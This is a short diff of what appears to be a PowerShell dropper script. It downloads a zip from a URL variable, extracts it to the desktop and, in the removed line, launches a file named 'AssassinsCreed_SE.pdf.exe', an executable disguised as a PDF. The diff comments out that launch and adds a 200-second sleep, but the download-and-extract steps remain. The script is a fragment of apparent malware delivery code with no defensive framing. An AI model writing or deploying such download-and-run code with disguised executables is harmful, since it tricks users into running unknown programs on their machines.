@@ -18,4 +18,6 @@ Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
 
 Expand-Archive -Path $zipFilePath -DestinationPath $desktopPath -Force
 
-Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.pdf.exe" 
+Start-Sleep -Seconds 200
+
+#Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.pdf.exe" 
